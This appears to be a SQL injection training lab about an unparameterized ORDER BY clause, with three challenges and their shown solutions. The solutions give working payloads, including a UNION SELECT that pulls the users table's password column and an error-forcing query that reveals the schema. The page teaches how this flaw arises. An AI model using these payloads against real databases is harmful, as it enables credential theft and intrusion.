Order By Injection

The ORDER BY clause can't use placeholders in most drivers. Here the sort column is concatenated directly — and that's all it takes.

PRODUCT CATALOG
CHALLENGES
01 — Leak the admin passwordThe users table has a password column. Make it appear in the result rows.
02 — Sort by a hidden columnOrder by cost even though it's not shown in the SELECT list.
03 — Force an error to fingerprint the tableMake the query fail in a way that reveals the table name.
View solutions
01 — Leak the admin password Append a UNION SELECT to the sort column. 
name FROM products WHERE category = 'tools' UNION SELECT password, password, password FROM users --

The injected UNION adds the users.password column as extra rows.

02 — Sort by a hidden column ORDER BY can reference columns not in the SELECT list. 
cost

The engine accepts any column name in ORDER BY, even ones not selected.

03 — Force an error to fingerprint the table Reference a non-existent table in a UNION. 
name FROM products WHERE category = 'tools' UNION SELECT * FROM secret --

The error message reveals the unknown table name, confirming the schema.
